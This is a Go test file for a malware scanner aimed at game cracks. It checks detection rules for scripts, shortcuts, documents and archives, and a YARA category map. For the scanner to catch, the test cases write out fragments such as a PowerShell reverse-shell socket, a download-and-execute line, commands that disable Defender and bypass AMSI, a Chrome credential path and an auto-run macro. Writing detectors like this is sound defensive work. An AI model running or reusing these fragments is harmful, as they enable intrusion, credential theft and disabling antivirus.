package rules

// Tests for the kind-specific rule sets (script / shortcut / doc / archive)
// and the YARA category mapping used for cross-engine de-duplication.

import (
	"testing"

	"gamecrack-scanner/internal/filetype"
	"gamecrack-scanner/internal/model"
)

func hasRule(findings []model.Finding, rule string) bool {
	for _, f := range findings {
		if f.Rule == rule {
			return true
		}
	}
	return false
}

func TestScriptRules(t *testing.T) {
	cases := []struct {
		name string
		strs []string
		rule string
	}{
		{"hidden window", []string{"Start-Process -WindowStyle Hidden -FilePath x.exe"}, "script_hidden_exec"},
		{"defender off", []string{"Set-MpPreference -DisableRealtimeMonitoring $true"}, "script_defender_bypass"},
		{"amsi bypass", []string{"amsiInitFailed"}, "script_defender_bypass"},
		{"reverse shell", []string{"$c = New-Object System.Net.Sockets.TCPClient('1.2.3.4',4444)"}, "script_reverse_shell"},
		{"downloader", []string{"IEX (New-Object Net.WebClient).DownloadString('http://x/y')"}, "script_download_exec"},
		{"miner", []string{"stratum+tcp://pool.example.com:3333"}, "script_crypto_miner"},
		{"credential paths", []string{"Copy-Item $env:APPDATA\\Google\\Chrome\\User Data"}, "script_cred_paths"},
		{"keylog api", []string{"GetAsyncKeyState"}, "script_hook_api"},
		{"obfuscation", []string{"powershell -enc SQBFAFgA"}, "script_obfuscation"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			findings, _ := Match(MatchInput{Kind: filetype.KindScript, Strs: c.strs})
			if !hasRule(findings, c.rule) {
				t.Errorf("expected rule %q, got %+v", c.rule, findings)
			}
		})
	}
}

// TestKindIsolation is the important negative test: a Word document that
// merely mentions PowerShell must not be treated as a malicious script.
func TestKindIsolation(t *testing.T) {
	strs := []string{"Start-Process -WindowStyle Hidden", "Set-MpPreference -DisableRealtimeMonitoring"}

	docFindings, _ := Match(MatchInput{Kind: filetype.KindDoc, Strs: strs})
	if hasRule(docFindings, "script_hidden_exec") {
		t.Errorf("script rules leaked into a document: %+v", docFindings)
	}
	if hasRule(docFindings, "script_defender_bypass") {
		t.Errorf("script rules leaked into a document: %+v", docFindings)
	}

	scriptFindings, _ := Match(MatchInput{Kind: filetype.KindScript, Strs: strs})
	if !hasRule(scriptFindings, "script_hidden_exec") {
		t.Errorf("script rules did not fire for a script: %+v", scriptFindings)
	}
}

func TestShortcutRules(t *testing.T) {
	findings, _ := Match(MatchInput{
		Kind: filetype.KindShortcut,
		Strs: []string{"powershell.exe -w hidden -enc SQBFAFgA", "C:\\Windows\\System32\\cmd.exe"},
	})
	if !hasRule(findings, "shortcut_exec") {
		t.Errorf("shortcut exec rule did not fire: %+v", findings)
	}
}

func TestDocRules(t *testing.T) {
	findings, _ := Match(MatchInput{Kind: filetype.KindDoc, Strs: []string{"Sub AutoOpen()", "Shell(\"powershell\")"}})
	if !hasRule(findings, "doc_macro") {
		t.Errorf("doc macro rule did not fire: %+v", findings)
	}
}

func TestArchiveRules(t *testing.T) {
	findings, _ := Match(MatchInput{Kind: filetype.KindArchive, Strs: []string{"invoice.pdf.exe"}})
	if !hasRule(findings, "archive_double_ext") {
		t.Errorf("archive double-ext rule did not fire: %+v", findings)
	}
}

// TestDoubleExtensionAnyKind checks the dropper shape is caught even when
// the file is not inside an archive.
func TestDoubleExtensionAnyKind(t *testing.T) {
	findings, _ := Match(MatchInput{
		Kind: filetype.KindUnknown,
		Path: `C:\Games\SomeGame\invoice.pdf.exe`,
	})
	if !hasRule(findings, "double_extension") {
		t.Errorf("double extension not detected: %+v", findings)
	}
	// A normal name must not trip it.
	findings, _ = Match(MatchInput{
		Kind: filetype.KindUnknown,
		Path: `C:\Games\SomeGame\game.exe`,
	})
	if hasRule(findings, "double_extension") {
		t.Errorf("false positive on a normal name: %+v", findings)
	}
}

// TestYaraCategoryMapping checks the cross-engine de-duplication map.
func TestYaraCategoryMapping(t *testing.T) {
	cases := map[string]string{
		"gc_discord_webhook":    "c2",
		"gc_telegram_bot_token": "c2",
		"gc_hardcoded_c2":       "c2",
		"gc_powershell_encoded": "evasion",
		"gc_keylogger_strings":  "keylogger",
		"gc_stealer_strings":    "stealer",
		"gc_injection_apis":     "injection",
		"gc_eicar":              "testfile",
		"gc_crack_emu_info":     "info",
		"some_unknown_rule":     "",
	}
	for rule, want := range cases {
		if got := YaraCategory(rule); got != want {
			t.Errorf("YaraCategory(%q) = %q, want %q", rule, got, want)
		}
	}
}
